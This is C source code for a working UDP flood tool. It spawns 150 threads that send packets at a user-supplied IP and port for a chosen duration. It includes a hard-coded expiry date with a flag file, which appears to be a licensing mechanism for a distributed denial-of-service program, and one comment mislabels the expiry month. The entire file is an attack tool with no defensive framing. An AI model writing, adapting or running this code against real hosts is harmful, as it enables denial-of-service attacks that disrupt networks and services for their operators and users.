#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE 1024
#define NUM_THREADS 150  // Number of threads to send UDP packets
#define EXPIRY_FLAG_FILE "expired.flag"

typedef struct {
    char* ip;
    int port;
    int duration;
} udp_params_t;

void* send_udp_traffic(void* params) {
    udp_params_t* udp_params = (udp_params_t*) params;
    struct sockaddr_in server_addr;
    int sockfd;
    char buffer[BUFFER_SIZE] = "UDP Flood Test";

    // Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(udp_params->port);
    if (inet_pton(AF_INET, udp_params->ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address");
        close(sockfd);
        pthread_exit(NULL);
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < udp_params->duration) {
        if (sendto(sockfd, buffer, sizeof(buffer), 0, (const struct sockaddr*) &server_addr, sizeof(server_addr)) < 0) {
            perror("Sendto failed");
            close(sockfd);
            pthread_exit(NULL);
        }
    }

    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    // Check if the expiry flag file exists
    if (access(EXPIRY_FLAG_FILE, F_OK) != -1) {
        fprintf(stderr, "This program has expired and can no longer be run.\n");
        return EXIT_FAILURE;
    }

    // Expiry date: Set your desired expiry year, month, day, hour, and minute
    const int expiry_year = 2025;
    const int expiry_month = 2;  // September (months are 1-12)
    const int expiry_day = 24;
    const int expiry_hour = 5;  // 24-hour format
    const int expiry_minute = 44;

    // Get the current time
    time_t now = time(NULL);
    struct tm* now_tm = localtime(&now);

    // Set the expiry time
    struct tm expiry_tm = {0};
    expiry_tm.tm_year = expiry_year - 1900;  // Years since 1900
    expiry_tm.tm_mon = expiry_month - 1;     // Months since January (0-11)
    expiry_tm.tm_mday = expiry_day;
    expiry_tm.tm_hour = expiry_hour;
    expiry_tm.tm_min = expiry_minute;
    expiry_tm.tm_sec = 0;

    time_t expiry_time = mktime(&expiry_tm);
    if (now > expiry_time) {
        // Create the expiry flag file
        FILE *flag_file = fopen(EXPIRY_FLAG_FILE, "w");
        if (flag_file) {
            fprintf(flag_file, "This program has expired.");
            fclose(flag_file);
        }
        
        fprintf(stderr, "This program has expired and can no longer be run.\n");
        return EXIT_FAILURE;
    }

    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <Port> <Duration (seconds)>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    if (port <= 0 || duration <= 0) {
        fprintf(stderr, "Port and duration must be positive integers.\n");
        return EXIT_FAILURE;
    }

    pthread_t threads[NUM_THREADS];
    udp_params_t udp_params = { ip, port, duration };

    // Create threads to send UDP traffic
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_udp_traffic, (void*) &udp_params) != 0) {
            perror("Thread creation failed");
            return EXIT_FAILURE;
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_join(threads[i], NULL) != 0) {
            perror("Thread join failed");
            return EXIT_FAILURE;
        }
    }

    printf("UDP flood completed for %d seconds to %s:%d\n", duration, ip, port);
    return EXIT_SUCCESS;
}
